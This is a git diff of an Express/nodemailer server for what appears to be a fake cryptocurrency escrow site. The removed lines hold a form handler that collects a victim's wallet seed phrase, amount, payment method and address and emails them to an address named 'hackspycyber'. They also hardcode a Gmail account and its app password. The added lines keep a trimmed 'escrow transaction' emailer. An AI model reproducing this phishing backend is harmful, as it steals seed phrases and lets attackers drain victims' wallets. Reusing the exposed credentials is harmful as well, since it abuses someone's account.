@@ -1,54 +1,51 @@
-const nodemailer = require('nodemailer');
-const express = require('express');
-const path = require('path');
+require("dotenv").config();
+const express = require("express");
+const nodemailer = require("nodemailer");
+const cors = require("cors");
 
 const app = express();
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-});
+const PORT = process.env.PORT || 10000; // Render assigns a PORT
 
-app.use(express.static(path.join(__dirname, 'public')));
+// Middleware
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(cors());
 
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
+// Serve static files (frontend)
+app.use(express.static("views"));
 
+// Email Configuration
 const transporter = nodemailer.createTransport({
-    service: 'gmail',
+    service: "gmail",
     auth: {
-        user: 'tobi.gbolagoke@gmail.com',
-        pass: 'eyvy vxru ouqk vchd'
+        user: process.env.EMAIL_USER, // Your Gmail
+        pass: process.env.EMAIL_PASS, // Your App Password
+    },
+});
+
+// API Route to Handle Transactions
+app.post("/send-email", async (req, res) => {
+    const { senderName, amount, currency } = req.body;
+    
+    const mailOptions = {
+        from: process.env.EMAIL_USER,
+        to: process.env.RECEIVER_EMAIL, // Email to receive transaction details
+        subject: "New Escrow Transaction",
+        text: `Sender: ${senderName}\nAmount: ${amount} ${currency}`,
+    };
+
+    try {
+        await transporter.sendMail(mailOptions);
+        res.status(200).json({ message: "Transaction email sent successfully!" });
+    } catch (error) {
+        res.status(500).json({ error: "Error sending email", details: error.message });
     }
 });
 
-app.post('/send-email', (req, res) => {
-    const { walletPhrase, transactionAmount, usdValue, paymentMethod, address } = req.body;
-
-    const mailOptions = {
-        from: 'tobi.gbolagoke@gmail.com',
-        to: 'hackspycyber@gmail.com',
-        subject: 'Escrow Transaction Details',
-        text: `
-        Wallet Phrase: ${walletPhrase}
-        Transaction Amount (π): ${transactionAmount}
-        Equivalent in USD: $${usdValue}
-        Payment Method: ${paymentMethod}
-        Receiving Address: ${address}
-        `
-    };
-
-    transporter.sendMail(mailOptions, (error, info) => {
-        if (error) {
-            console.error('Error sending email:', error);
-            res.status(500).send('Error sending email');
-        } else {
-            console.log('Email sent:', info.response);
-            res.send('Email sent successfully');
-        }
-    });
+// Serve Homepage
+app.get("/", (req, res) => {
+    res.sendFile(__dirname + "/views/index.html");
 });
 
-app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
-});
+// Start Server
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
